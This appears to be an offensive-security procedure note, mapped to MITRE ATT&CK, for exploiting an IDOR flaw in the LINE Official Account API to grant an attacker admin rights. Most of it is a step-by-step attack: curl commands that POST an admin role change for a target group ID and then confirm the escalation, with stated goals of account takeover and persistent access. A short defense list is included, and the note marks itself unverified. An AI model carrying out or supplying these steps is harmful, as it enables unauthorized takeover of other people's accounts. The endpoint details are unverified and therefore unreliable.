---
tags:
  - idor
  - privilege-escalation
  - web
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-assign-admin-rights]]'
platforms:
  - Web
techniques:
  - '[[Exploitation for Privilege Escalation]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: fb47f0c0-ded5-432e-ba0b-fe18d9442f9e
created_at: '2025-12-14T17:30:58.615Z'
updated_at: '2025-12-14T17:30:58.615Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Craft-IDOR-Request-to-Assign-Admin-Rights

## Summary

This procedure exploits IDOR in LINE Official Account admin assignment by crafting an HTTP request with a target group ID, lacking proper authorization, to elevate the attacker's role to administrator and achieve account takeover.

## Description

The vulnerability allows unauthenticated or weakly authenticated POST requests to modify admin permissions for any group ID. By substituting a target ID into the endpoint, attackers bypass access controls, gaining full admin functions like user management and message broadcasting. This targets the web API for LINE Official Accounts.

## Requirements

1. Valid target group ID from prior discovery
2. Attacker's own LINE access token (if partial auth is enforced)
3. HTTP client for POST requests

## Defense

Defensive measures and detection strategies:

- Enforce strict authorization on permission modification endpoints
- Validate requester's ownership of the group ID
- Log and alert on admin role changes from unexpected sources

## Objectives

1. Assign admin privileges to the attacker on the target account
2. Verify escalation by performing admin actions
3. Maintain persistent access for further exploitation

## Instructions

### Step 1: Prepare and Send Admin Assignment Request

**Context**: Construct a POST request to the permissions endpoint, inserting the target group ID and specifying the admin role, exploiting the IDOR to ignore ownership checks.

**Command** ([[commands/curl-assign-admin-rights]]):
```bash
curl -X POST "https://api.line.me/v2/bot/group/{target_group_id}/members/permissions" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer {attacker_token}" \
  -d '{"role": "admin"}'
```

> This submits the role change. Expected output: HTTP 200 with {"role": "admin"} confirming success. Omit Authorization if not required.

### Step 2: Verify Admin Privileges

**Context**: Query the account's admin list or attempt an admin-only action to confirm elevation.

**Command** ([[commands/curl-assign-admin-rights]]):
```bash
curl -X GET "https://api.line.me/v2/bot/group/{target_group_id}/members/admins" -H "Authorization: Bearer {attacker_token}"
```

> Expected output: JSON listing the attacker as admin, e.g., {"admins": [{"userId": "attacker_id", "role": "admin"}]}.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/curl-assign-admin-rights]]

## Tools Used


## Tags

- [[idor]]
- [[privilege-escalation]]
- [[web]]
